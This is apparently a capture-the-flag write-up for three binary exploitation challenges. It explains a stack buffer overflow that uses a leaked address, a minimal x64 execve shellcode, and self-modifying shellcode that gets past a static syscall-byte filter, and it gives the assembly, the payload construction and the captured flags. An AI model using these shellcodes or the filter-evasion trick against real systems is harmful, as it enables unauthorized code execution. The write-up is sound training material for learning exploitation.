# ShellCode

The scripts for the exploits can be found in the `/solutions` folder.

## bof101

The goal of this challenge is to get a shell by exploiting a buffer overflow vulnerability in a 32-bit binary Position Independent Executable (PIE). The binary reads a name with `gets()` from the user and stores it in a fixed-size buffer without proper bounds checking. By providing a carefully crafted input, we can overwrite the return address of the function to point to our shellcode, which will spawn a shell when executed.

### Solution

The solution involves the following steps:

---

1. **Identify the vulnerability**

The function `foo()` allocates a local buffer and then calls the `gets()` function

```c
char buffer[32];
gets(name);
```
---

2. **Understand the stack layout and compute the offsets**

From the challenge output:

- We can see the stack dump near the end of `foo()`:

```sh
0xff... | 4c d8 89 ff  | L... |
0xff... | 48 a2 04 08  | H... |
0xff... | fa 96 04 08  | .... |  <--- saved return address (IP)
0xff... | 58 d8 89 ff  | X... |
0xff... | 20 97 04 08  |  ... |
0xff... | 00 c0 04 08  | .... |
0xff... | 00 00 00 00  | .... |  <--- end of the buffer "name"
0xff... | 00 00 00 00  | .... |
0xff... | 00 00 00 00  | .... |
0xff... | 00 00 00 00  | .... |
0xff... | 00 00 00 00  | .... |
0xff... | 00 00 00 00  | .... |
0xff... | 00 00 00 00  | .... |
0xff... | 00 00 00 00  | .... |  <--- beginning of the buffer "name"
0xff... | 00 c0 04 08  | .... |
```

We can calculate the distance between the beginning of the buffer and the saved return address :

 $4 \times 8 + 3 \times 4 = 44$ bytes

So we need 44 bytes of padding to overwrite the return address with the address of our shellcode.

But, what address should we use for the JUMP to the shellcode, given that it was compiled with ASLR?

---

3. **Use the info leak to find a stack address**

The `main()` function intentionally leaks the address of the local variable `x`:

```c
printf("Since this is your first challenge, you'll get a leak for free: &x=%p\n", &x);
```

Since `x` lives on the stack, knowing `&x` allows us to infer the addresses of other stack variables in the same frame, including the `ret` address and so, the address of our shellcode.

The distance between x and the ret address is constant, and is 

$*x - *ret = 32$ bytes  

*Note: we know the ret address (\*ret) from the stack dump output*

So we can compute the  address where will locate our shellcode on the stack as follows:

```sh
shell_addr = x_addr - 28  # 32 - 4 (to point to skip ret and point to the beginning of the shellcode)
```
---

1. **Build the payload**

The payload has three parts:

- Padding to fill the buffer and reach the saved return address (44 bytes of 'a').

- Overwritten return address, which we set to the address where our shellcode will reside on the stack (shell_addr).

- Shellcode itself, which is appended after the return address.

```sh
payload = b'a' * OFFSET_RIP + p32(shell_addr) + asm(shellcraft.sh())
```

### Result

When we run the exploit, we get a shell and can read the flag:

```sh
$ python3 exploit_bof101.py REMOTE

flag.txt
    ### output
    BASC{Congratz_U_3Xpl0it3d_your_f1r5t_BOF}
```


## small-code

The goal of this challenge is to execute a small shellcode (maximum 18 bytes) on a remote service that accepts x64 shellcode and runs it. The shellcode should spawn a shell.

### Solution

The solution involves writing a minimal shellcode that executes the `execve("/bin/sh", NULL, NULL)` system call to spawn a shell.

The shellcode is as follows:

```asm
BITS 64
mov rbx, 0x68732f6e69622f 
push rbx             
mov rdi, rsp         
mov al, 0x3b          
syscall               
```

This shellcode does the following:

1. Moves the string "/bin/sh" into the `rbx` register.
2. Pushes the string onto the stack.
3. Sets up the `rdi` register to point to the string on the stack.
4. Sets the `al` register to 0x3b, which is the syscall number for `execve`.
5. Invokes the syscall to execute `/bin/sh`.

Assembly and extraction of the shellcode can be done with the following commands:

```sh
nasm -f elf64 shellcraft.asm 
ld -m elf_x86_64 shellcraft.o 
objcopy --dump-section .text=sc a.out 
xxd -p sc ## to check the length
```


### Result

When we run the exploit, we get a shell and can read the flag:

```sh
python3 exploit_smallcode.py REMOTE

flag.txt
    ### output
    BASC{0pT1miZin9_5h3llc0d3_iS_n0T_s0_H4rD}
```


## no-syscalls

The goal of this challenge is to execute a shellcode (maximum 42 bytes) on a remote service that reads shellcode into a buffer and executes it, but with the restriction that the shellcode must not contain any system call instructions.


**runner behaviour**:

The program scans the original content of the buffer (the one read by `read()`), looking for the following byte sequences:

- `\xCD\x80` → `INT 0x80`
- `\x0F\x05` → `SYSCALL`
- `\x0F\x34` → `SYSENTER` 

If it does not find these sequences in the bytes read, it executes the buffer as code.

The check is only static on the hexadecimal content of the buffer immediately after `read()`. There is no dynamic check on writes that occur afterward.

### Solution

The allocation in memory of the arguments for the `execve("/bin/sh", NULL, NULL)` instruction is prepared similarly to the `bof101` challenge, but on a 32-bit architecture:

```asm
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0x0b ; insead of 0x3b for 64 bit
```

How to obfuscate the opcode `INT 0x80` (interrupt `0xCD 0x80`)?

```asm

call get_eip ; push eip
get_eip:
    pop esi ; get current eip in esi       

add esi, 2       

mov byte [esi], 0xCD
mov byte [esi+1], 0x80

call esi            

```

The idea is to dynamically create the sequence in memory, only after the runner has finished checking the buffer.

1. The address of `__buf` is not known a priori (ASLR).
   - Use `call/pop` to get the current address of the code being executed.
   - Calculate the address where to write the two bytes `0xCD 0x80` (offset of 2 bytes after the `call` instruction): `add esi, 2`.
   - Write the two bytes to the memory address pointed to by the `esi` register.

The `esi` register, which in this case contains a memory address, is updated to point to a memory area 2 bytes ahead of the one it previously pointed to (IP).

Assembly and extraction of the shellcode can be done with the following commands:

```sh
nasm -f elf32  shellcraft32.asm
ld -m elf_i386 shellcraft32.o
objcopy --dump-section .text=sc a.out
xxd -p sc
```

### Result

When we run the exploit, we get a shell and can read the flag:

```sh
python3 exploit_nosyscalls.py REMOTE
flag.txt
    ### output
    BASC{s4ndb0X1n9_AiNt_3a5y}
```